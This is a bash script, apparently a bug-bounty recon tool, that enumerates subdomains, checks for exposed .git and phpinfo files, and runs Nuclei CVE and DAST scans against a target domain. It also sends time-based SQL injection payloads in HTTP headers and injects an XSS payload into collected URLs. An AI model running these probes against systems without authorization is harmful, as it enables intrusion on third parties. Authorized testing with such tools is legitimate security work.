#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'
GREEN='\033[0;32m'
VIOLET='\033[35m'
echo -e """${VIOLET}
░█▀▀█ ░▀░ ▀▀█ █▀▀ █▀▀▄ 
▒█▄▄█ ▀█▀ ▄▀░ █▀▀ █░░█ 
▒█░▒█ ▀▀▀ ▀▀▀ ▀▀▀ ▀░░▀${RESET}"""
echo -e "${GREEN}By Dhane Ashley Diabajo${RESET}"
echo ""

usage() {
    echo "Usage: $0 -t <target_domain> [-n] [-s] [-d] [-j]"
    echo "  -n Run Nuclei scans for URLs"
    echo "  -s Run Nuclei scans for subdomains"
    echo "  -d Run DAST scan"
    echo "  -j JS File Analysis"
    exit 1
}

# Initialize variables
TARGET_DOMAIN=""
RUN_NUCLEI_URLS=false
RUN_NUCLEI_SUBDOMAINS=false
RUN_DAST=false
RUN_JS=false

# Parse command-line options
while getopts ":t:nsdj" opt; do
    case "${opt}" in
        t) TARGET_DOMAIN=${OPTARG} ;;
        n) RUN_NUCLEI_URLS=true ;;
        s) RUN_NUCLEI_SUBDOMAINS=true ;;
        d) RUN_DAST=true ;;
        j) RUN_JS=true ;;
        *) usage ;;
    esac
done

# Check if TARGET_DOMAIN is set
if [ -z "${TARGET_DOMAIN}" ]; then
    usage
fi

echo -e "${VIOLET}Creating Subdomain Directory${RESET}"
mkdir -p Subdomains

echo -e "${VIOLET}Running Subfinder, Anew, and Httpx...${RESET}"
echo "${TARGET_DOMAIN}" | subfinder -silent | anew | httpx -silent | tee >(grep . > Subdomains/subdomains.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running Httpx Scanning for sensitive files...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -path "/server-status" -mc 200 -title | tee >(grep . > Subdomains/httpx-Server-status.txt) >/dev/null 2>&1
cat Subdomains/subdomains.txt | httpx -silent -path "/phpinfo.php" -mc 200 -title | tee >(grep . > Subdomains/httpx-phpinfo.txt) >/dev/null 2>&1
cat Subdomains/subdomains.txt | httpx -silent -path "/.DS_Store" -mc 200 -title | tee >(grep . > Subdomains/httpx-DS_store.txt) >/dev/null 2>&1
cat Subdomains/subdomains.txt | httpx -silent -path "/.git" -mc 200 -title | tee >(grep . > Subdomains/httpx-git.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running Httpx...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -sc -title -cl --tech-detect | tee >(grep . > Subdomains/httpx-details.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running Naabu...${RESET}"
cat Subdomains/subdomains.txt | naabu --passive -silent | tee >(grep . > Subdomains/ports.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running Subzy and checking for subdomain takeovers...${RESET}"
subzy run --vuln --targets Subdomains/subdomains.txt | tee >(grep . > Subdomains/subzy.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running SQLi attack using X-Forwarded-For...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' | tee >(grep . > Subdomains/SQLi-X-Forwarded-For.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running SQLi attack using X-Forwarded-Host...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwarded-Host:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' | tee >(grep . > Subdomains/SQLi-X-Forwarded-Host.txt) >/dev/null 2>&1

echo -e "${VIOLET}Running SQLi attack using User-Agent...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' | tee >(grep . > Subdomains/SQLi-User-Agent.txt) >/dev/null 2>&1

# Nuclei for Subdomains
if [ "${RUN_NUCLEI_SUBDOMAINS}" = true ]; then
    echo -e "${VIOLET}Creating nuclei directory for subdomains...${RESET}"
    mkdir -p Subdomains/nuclei

    for year in {2000..2024}; do
        echo -e "${VIOLET}Running Nuclei template for year $year...${RESET}"
        nuclei -l Subdomains/subdomains.txt -silent -rate-limit 200 -t ~/nuclei-templates/http/cves/$year/*.yaml | tee >(grep . > Subdomains/nuclei/nuclei-$year.txt) >/dev/null 2>&1
    done
fi

# URL collection
source $HOME/venv/bin/activate
mkdir -p urls

echo -e "${VIOLET}Running Katana...${RESET}"
echo "${TARGET_DOMAIN}" | katana -silent -d 5 -ps -pss waybackarchive,commoncrawl,alienvault > urls/katana.txt

echo -e "${VIOLET}Running GAU...${RESET}"
echo "${TARGET_DOMAIN}" | gau --subs --blacklist ttf,woff,svg,png --providers wayback,commoncrawl,otx,urlscan > urls/gau.txt

echo -e "${VIOLET}Running Waybackurls...${RESET}"
waybackurls "${TARGET_DOMAIN}" > urls/waybackurls.txt

echo -e "${VIOLET}Combining all URLs${RESET}"
cat urls/katana.txt urls/gau.txt urls/waybackurls.txt > urls/final-clean.txt


if [ "${RUN_JS}" = true ]; then
    echo -e "${VIOLET}Starting JS file Analysis...${RESET}"
    echo -e "${VIOLET}Starting JS file analysis...${RESET}"
    autofinder -f urls/final-clean.txt
    
fi

echo -e "${VIOLET}Checking for possible XSS vulnerabilities...${RESET}"
cat urls/final-clean.txt | gf xss | qsreplace '"><img src=x onerror=alert("XSS")>' | 
while read -r host; do 
    if curl -sk --path-as-is "$host" | grep -qs '"><img src=x onerror=alert("XSS")>'; then 
        echo "$host is vulnerable" >> urls/possible-xss.txt
    fi
done

echo -e "${VIOLET}Running GF${RESET}"

cat urls/final-clean.txt | gf xss | tee >(grep . > urls/xss.txt) >/dev/null 2>&1
cat urls/final-clean.txt | gf sqli | tee >(grep . > urls/sqli.txt) >/dev/null 2>&1
cat urls/final-clean.txt | gf redirect | egrep -iv "wp-" | tee >(grep . > urls/open-redirect.txt) >/dev/null 2>&1
cat urls/final-clean.txt | gf ssrf | tee >(grep . > urls/ssrf.txt) >/dev/null 2>&1
cat urls/final-clean.txt | gf rce | tee >(grep . > urls/rce.txt) >/dev/null 2>&1
cat urls/final-clean.txt | gf lfi | tee >(grep . > urls/lfi.txt) >/dev/null 2>&1
cat urls/final-clean.txt | gf interestingEXT | tee >(grep . > urls/interestingEXT.txt) >/dev/null 2>&1

# Nuclei for URLs
if [ "${RUN_NUCLEI_URLS}" = true ]; then
    echo -e "${VIOLET}Creating nuclei directory for URLs...${RESET}"
    mkdir -p urls/nuclei

    for year in {2000..2024}; do
        echo -e "${VIOLET}Running Nuclei template for URLs for year $year...${RESET}"
        nuclei -l urls/final-clean.txt -silent -rate-limit 200 -t ~/nuclei-templates/http/cves/$year/*.yaml | tee >(grep . > urls/nuclei/nuclei-$year.txt) >/dev/null 2>&1
    done
fi

# DAST scans
if [ "${RUN_DAST}" = true ]; then
    echo -e "${VIOLET}Checking for XSS, SQLi, LFI, RFI, SSRF, Open-Redirect, CSTI vulnerabilities...${RESET}"
    mkdir -p dast

    cat urls/xss.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/xss/reflected-xss.yaml | tee >(grep . > dast/reflected-xss.txt) >/dev/null 2>&1
    cat urls/xss.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/xss/dom-xss.yaml | tee >(grep . > dast/dom-xss.yaml) >/dev/null 2>&1
    cat urls/sqli.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/sqli/sqli-error-based.yaml | tee >(grep . > dast/sqli-errorbased.txt) >/dev/null 2>&1
    cat urls/sqli.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/sqli/time-based-sqli.yaml | tee >(grep . > dast/sqli-timebased.txt) >/dev/null 2>&1
    cat urls/open-redirect.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/redirect/open-redirect.yaml | tee >(grep . > dast/redirect.txt) >/dev/null 2>&1
    cat urls/lfi.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/lfi/lfi.yaml | tee >(grep . > dast/lfi.txt) >/dev/null 2>&1
    cat urls/ssrf.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/ssrf/ssrf.yaml | tee >(grep . > dast/ssrf.txt) >/dev/null 2>&1
    cat urls/rce.txt | nuclei -silent -dast ~/nuclei-templates/dast/vulnerabilities/rce/rce.yaml | tee >(grep . > dast/rce.txt) >/dev/null 2>&1
fi


echo -e "${VIOLET}Scan Completed!${RESET}"
